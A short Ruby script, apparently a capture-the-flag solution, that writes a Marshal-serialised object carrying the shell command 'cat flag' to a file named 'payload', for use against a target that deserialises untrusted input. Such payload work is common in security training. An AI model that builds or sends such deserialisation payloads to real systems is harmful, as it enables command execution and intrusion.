#!/usr/bin/ruby
class Kaibro
    def initialize name
        @name = name
    end

    def name
        @name
    end
end

File.open('payload','wb') do |f| 
    f.write Marshal.dump(Kaibro.new("cat flag"))
    f.write "*"
end
#t = Marshal.load(File.open('/tmp/pay', &:read))
